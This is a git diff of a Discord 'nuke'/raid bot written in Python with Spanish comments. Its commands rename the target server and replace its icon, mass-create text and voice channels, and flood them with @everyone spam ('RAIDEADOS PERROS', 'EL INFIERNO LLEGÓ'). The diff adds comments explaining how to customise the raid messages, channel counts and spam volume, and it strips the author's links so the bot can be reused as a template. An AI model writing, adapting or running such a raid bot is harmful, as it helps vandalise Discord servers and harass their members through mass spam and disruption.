@@ -330,9 +330,9 @@ async def nuke(ctx):
 
     # Cambiar nombre e icono del servidor
     try:
-        with open('DAFNE/DAFNE.png', 'rb') as f:
+        with open('DAFNE/DAFNE.png', 'rb') as f:  # Cambiar DAFNE/DAFNE.png por la carpeta y la imagen del bot, también pueden usar la imagen del bot sin la carpeta
             icono = f.read()
-            await ctx.guild.edit(name="☢️ NUKE-BY-DARK ☢️", icon=icono)
+            await ctx.guild.edit(name="☢️ NUKE-BY-DARK ☢️", icon=icono) # Pueden cambiar ☢️ NUKE-BY-DARK ☢️ por lo que gusten
     except FileNotFoundError:
         print("❌ Archivo 'DAFNE/DAFNE.png' no encontrado.")
     except discord.Forbidden:
@@ -358,7 +358,7 @@ async def nuke(ctx):
         canales_texto = []
         for emoji in emojis_texto:
             try:
-                canal = await ctx.guild.create_text_channel(f'{emoji}nuke-by-dark')
+                canal = await ctx.guild.create_text_channel(f'{emoji}nuke-by-dark')  # Pueden cambiar nuke-by-dark por lo que gusten
                 canales_texto.append(canal)
             except Exception as e:
                 print(f"❌ Error al crear canal de texto con emoji {emoji}: {e}")
@@ -367,7 +367,7 @@ async def nuke(ctx):
         emojis_voz = ['🔊', '🎧', '📣', '📢', '🗣️', '🎙️', '📻', '🔔', '🎶', '🎵', '🔇'] 
         for emoji in emojis_voz:
             try:
-                await ctx.guild.create_voice_channel(f'{emoji}nuke-by-dark')
+                await ctx.guild.create_voice_channel(f'{emoji}nuke-by-dark') # Pueden cambiar nuke-by-dark por lo que gusten
             except Exception as e:
                 print(f"❌ Error al crear canal de voz con emoji {emoji}: {e}")
     except Exception as e:
@@ -375,11 +375,11 @@ async def nuke(ctx):
         canales_texto = []
 
     # Enviar spam masivo sin pausas
-    mensaje = "@everyone 💀 **Este servidor ha sido bombardeado por DARK.**\n🔥 _Prepárate para el caos..._"
+    mensaje = "@everyone 💀 **Este servidor ha sido bombardeado por DARK.**\n🔥 _Prepárate para el caos..._" # Pueden cambiar el mensaje por el que gusten
     mensajes = []
     for canal in canales_texto:
         if isinstance(canal, discord.TextChannel):
-            mensajes.extend([canal.send(mensaje) for _ in range(30)])  # 10 mensajes por canal
+            mensajes.extend([canal.send(mensaje) for _ in range(30)])  # Cambiar el 30 por la cantidad de mensajes que quieran por canal
     await asyncio.gather(*mensajes, return_exceptions=True)
 
     print("✅ NUKE ejecutado rápidamente.")
@@ -419,7 +419,7 @@ async def purga(ctx):
 @commands.has_permissions(administrator=True)
 async def bombardeo(ctx):
     await ctx.message.delete()
-    mensaje = "@everyone 🚨 **¡Este servidor ha sido comprometido temporalmente!**"
+    mensaje = "@everyone 🚨 **¡Este servidor ha sido comprometido temporalmente!**" # Pueden cambiar el mensaje por lo que quieran
 
     for canal in ctx.guild.text_channels:
         try:
@@ -452,8 +452,8 @@ async def invite(ctx):
 
     # Agrega enlaces útiles
     invite_url = discord.utils.oauth_url(app_info.id, permissions=discord.Permissions.all())
-    support_url = "https://discord.gg/jSpvXKzF2N"
-    github_url = "https://github.com/Warrior20005"
+    support_url = "https://discord.gg/" # Despues de / pongan su codigo o enlace completo de su servidor 
+    github_url = "https://github.com/" # Despues de / pongan su perfil 
 
     embed.add_field(name="📨 Invitación", value=f"[Invita a {bot_user.name}]({invite_url})", inline=False)
     embed.add_field(name="🛠️ Servidor de Soporte", value=f"[Únete al Soporte]({support_url})", inline=False)
@@ -475,14 +475,14 @@ async def spamstorm(ctx):
     """Crea muchas categorías y canales, luego envía spam masivo en todos a la vez"""
     await ctx.message.delete()
     nombre = "☣️-storm"
-    mensaje = "@everyone 🔊 **RAIDEADOS PERROS** 🔥🔥🔥"
+    mensaje = "@everyone 🔊 **RAIDEADOS PERROS** 🔥🔥🔥" # Pueden cambiar el mensaje por lo que gusten
     canales_creados = []
 
     # Crear categorías y canales
-    for _ in range(5):  # 5 categorías
+    for _ in range(5):  # Pueden cambiar el 5 por la cantidad de categorías
         try:
             categoria = await ctx.guild.create_category(nombre)
-            for _ in range(5):  # 5 canales por categoría
+            for _ in range(5):  # Pueden cambiar el 5 por la cantidad de canales por categoría
                 canal = await ctx.guild.create_text_channel(nombre, category=categoria)
                 canales_creados.append(canal)
                 await asyncio.sleep(0.1)
@@ -492,7 +492,7 @@ async def spamstorm(ctx):
     # Lanzar el spam en todos los canales creados
     tareas_spam = []
     for canal in canales_creados:
-        for _ in range(10):  # 10 mensajes por canal
+        for _ in range(10):  # Pueden cambiar el 10 por la cantidad mensajes que quieren por canal
             tareas_spam.append(canal.send(mensaje))
     
     await asyncio.gather(*tareas_spam, return_exceptions=True)
@@ -507,12 +507,12 @@ async def infierno(ctx):
     """Crea 20 canales de texto con spam de 10 mensajes cada uno"""
     await ctx.message.delete()
     nombre = "🔥-infierno"
-    mensaje = "@everyone 💢 **EL INFIERNO LLEGÓ** 💢"
+    mensaje = "@everyone 💢 **EL INFIERNO LLEGÓ** 💢" # Pueden cambiar el mensaje por lo que gusten
 
     canales = []
 
     # Primero crear todos los canales
-    for _ in range(20):
+    for _ in range(20):  # Pueden cambiar el 20 por la cantidad de canales que quirean
         try:
             canal = await ctx.guild.create_text_channel(nombre)
             canales.append(canal)
@@ -523,7 +523,7 @@ async def infierno(ctx):
     # Luego enviar el spam en todos los canales simultáneamente
     tareas_spam = []
     for canal in canales:
-        for _ in range(10):
+        for _ in range(10): # Pueden cambiar el 10 por la cantidad mensajes que quieren por canal
             tareas_spam.append(canal.send(mensaje))
 
     await asyncio.gather(*tareas_spam, return_exceptions=True)
@@ -538,11 +538,11 @@ async def oleada(ctx):
     """Crea canales rápidamente y luego los llena de spam"""
     await ctx.message.delete()
     nombre = "⚡-oleada"
-    mensaje = "@everyone 🌪️ **RAIDEADOS PERROS** 🌪️"
+    mensaje = "@everyone 🌪️ **RAIDEADOS PERROS** 🌪️" # Pueden cambiar el mensaje por lo que gusten
     canales = []
 
     # Crear 15 canales
-    for _ in range(15):
+    for _ in range(15): # Pueden cambiar el 15 por la cantidad de canales que quieran
         try:
             canal = await ctx.guild.create_text_channel(nombre)
             canales.append(canal)
@@ -553,7 +553,7 @@ async def oleada(ctx):
     # Enviar spam en todos los canales
     tareas = []
     for canal in canales:
-        for _ in range(10):
+        for _ in range(10): #Pueden cambiar el 10por la cantidad mensajes que quieren por canal
             tareas.append(canal.send(mensaje))
     await asyncio.gather(*tareas, return_exceptions=True)
 
@@ -562,7 +562,7 @@ async def oleada(ctx):
 # ---------------------------------------- 
 @bot.command()
 @commands.has_permissions(administrator=True)
-async def msjspam(ctx, *, mensaje: str = "@everyone ⚠️ **RAIDEADOS PERROS**🔥🔥🔥"):
+async def msjspam(ctx, *, mensaje: str = "@everyone ⚠️ **RAIDEADOS PERROS**🔥🔥🔥"):  # Pueden cambiar el mensaje por lo que gusten
     """Crea 20 canales con emojis aleatorios y spam personalizado"""
     await ctx.message.delete()
     nombre_base = "📡-msjspam"
@@ -571,7 +571,7 @@ async def msjspam(ctx, *, mensaje: str = "@everyone ⚠️ **RAIDEADOS PERROS**�
     canales_creados = []
 
     # Crear 20 canales con nombres únicos y emojis aleatorios
-    for _ in range(20):
+    for _ in range(20):  # Pueden cambiar el 20 por la cantidad de canales que quieran
         emoji = random.choice(emojis)
         nombre = f"{emoji}-{nombre_base}"
         try:
@@ -584,7 +584,7 @@ async def msjspam(ctx, *, mensaje: str = "@everyone ⚠️ **RAIDEADOS PERROS**�
     # Spam personalizado en todos los canales simultáneamente
     tareas = []
     for canal in canales_creados:
-        for _ in range(10):
+        for _ in range(10):  # Pueden cambiar el 10 por la cantidad mensajes que quieren por canal
             tareas.append(canal.send(mensaje))
     await asyncio.gather(*tareas, return_exceptions=True)
 
